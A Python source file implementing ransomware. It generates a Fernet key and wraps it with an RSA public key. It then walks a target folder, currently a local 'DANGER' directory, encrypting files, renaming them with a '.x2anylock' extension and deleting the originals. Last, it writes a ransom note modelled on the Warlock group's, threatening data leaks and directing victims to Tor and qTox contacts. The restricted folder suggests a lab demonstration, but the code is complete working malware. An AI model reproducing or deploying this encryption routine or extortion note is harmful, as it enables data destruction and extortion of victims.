from cryptography.fernet import Fernet
import os
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

class RansomWare:

    file_exts = ['txt', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'jpg', 'jpeg', 'png']

    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None

        script_dir = os.path.dirname(os.path.abspath(__file__))
        self.localRoot = os.path.join(script_dir, 'DANGER')


        print(f'[*] Local Root: {self.localRoot}')


    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)
    

    #checks for encrypted files and ransom note
    @staticmethod
    def skip(file_path):
        filename = os.path.basename(file_path).lower()  
        return (filename.endswith('.x2anylock') or filename == 'readme.txt')

    def crypt_file(self, file_path):
        filename = os.path.basename(file_path).lower()
        if self.skip(file_path):
            print(f'SKIPPED: {file_path}')
            return

        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                encrypted_data = self.crypter.encrypt(data)
                new_path = file_path + '.x2anylock'
                with open(new_path, 'wb') as f:
                    f.write(encrypted_data)
                os.remove(file_path)
                print(f'Encrypted: {file_path} → {new_path}')
        except Exception as e:
            print(f'Error processing {file_path}: {e}')



    def crypt_system(self):  
        system = os.walk(self.localRoot, topdown=True)
        for root, dirs, files in system:
            normalized_root = os.path.normpath(root)
            for file in files:
                file_path = os.path.join(root, file)
                filename = os.path.basename(file).lower()
                self.crypt_file(file_path)

    def encrypt_fernet_key(self):
        self.public_key = RSA.import_key(open('public.pem').read())
        public_crypter = PKCS1_OAEP.new(self.public_key)
        enc_fernet_key=public_crypter.encrypt(self.key)
        key_path=os.path.join(self.localRoot,'YOUR_KEY.txt.x2anylock')
        with open(key_path,'wb') as fa:
            fa.write(enc_fernet_key)                    
        print(f'Encrypted Fernet key in: {key_path}')
    
    def drop_ransom_note(self):
        note_path = os.path.join(self.localRoot, 'README.txt')
        ransom_text = (
            """ ==================== WARLOCK RANSOMWARE ====================
         We are [Warlock Group], a professional hack organization. We regret to inform you that your systems have been successfully infiltrated by us,and your critical data has been encrypted.
         Additionally, we have securely backed up portions of your data to ensure the quality of our services.      
        ====>What Happened?
        Your systems have been locked using our advanced encryption technology. You are currently unable to access critical files or continue normal business operations. We possess the decryption key and have backed up your data to ensure its safety.
        ====>If You Choose to Pay:
        Swift Recovery: We will provide the decryption key and detailed guidance to restore all your data within hours.
        Data Deletion: We guarantee the permanent deletion of any backed-up data in our possession after payment, protecting your privacy.
        Professional Support: Our technical team will assist you throughout the recovery process to ensure your systems are fully restored.
        Confidentiality: After the transaction, we will maintain strict confidentiality regarding this incident, ensuring no information is disclosed.
        ====>If You Refuse to Pay:
        Permanent Data Loss: Encrypted files will remain inaccessible, leading to business disruptions and potential financial losses.
        Data Exposure: The sensitive data we have backed up may be publicly released or sold to third parties, severely damaging your reputation and customer trust.
        Ongoing Attacks: Your systems may face further attacks, causing even greater harm.
        ====>How to Contact Us?
        Please reach out through the following secure channels for further instructions(When contacting us, please provide your decrypt ID):
        ###Contact 1:
        Your decrypt ID: [snip]
        Dark Web Link: <REDIRECTED>
        Your Chat Key: [snip]
        You can visit our website and log in with your chat key to contact us. Please note that this website is a dark web website and needs to be accessed using the Tor browser. You can visit the Tor Browser official website (https://www.torproject.org/) to download and install the Tor browser, and then visit our website.
        ###Contact 2:
        If you don't get a reply for a long time, you can also download qtox and add our ID to contact us
        Download:https://qtox.github.io/
        Warlock qTox ID: <REDACTED>
        Our team is available 24/7 to provide professional and courteous assistance throughout the payment and recovery process.
        We don't need a lot of money, it's very easy for you, you can earn money even if you lose it, but your data, reputation, and public image are irreversible, so contact us as soon as possible and prepare to pay is the first priority. Please contact us as soon as possible to avoid further consequences.

        ==========================================================="""
        )

        try:
            os.makedirs(os.path.dirname(note_path), exist_ok=True)
            with open(note_path, 'w') as f:
                f.write(ransom_text)
            print(f'README: {note_path}')
        except Exception as e:
            print(f'ERROR README: {e}')


def main():
    rw = RansomWare()
    rw.generate_key()
    rw.encrypt_fernet_key()   
    rw.crypt_system()         
    rw.drop_ransom_note()    

if __name__ == '__main__':
    main()
